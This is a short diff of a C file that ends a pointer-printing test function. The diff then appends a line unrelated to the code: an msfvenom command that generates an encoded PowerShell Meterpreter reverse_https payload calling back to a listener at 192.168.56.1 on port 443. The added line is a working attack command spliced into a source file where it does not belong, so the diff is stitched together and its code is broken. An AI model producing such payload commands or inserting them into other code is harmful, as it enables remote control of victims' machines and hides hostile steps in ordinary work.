@@ -21,3 +21,5 @@ void test(int *j, char* buf){
 	printf("OK.\t| %u\t| %u\t| %u\t| %d\n",j, buf, &buf[SIZE],*j); 
 	return;
 }
+
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.56.1 LPORT=443 -f ps1 -e cmd/powershell_base64 > payload.ps1
